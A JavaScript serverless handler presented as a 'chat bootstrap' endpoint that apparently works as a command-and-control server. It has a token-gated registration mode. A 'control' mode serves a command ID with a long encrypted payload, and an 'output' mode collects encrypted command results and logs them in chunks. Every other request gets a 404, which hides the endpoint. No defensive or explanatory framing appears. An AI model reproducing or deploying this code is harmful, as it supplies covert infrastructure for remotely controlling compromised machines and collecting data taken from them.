import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '21';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) {
      console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    }
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
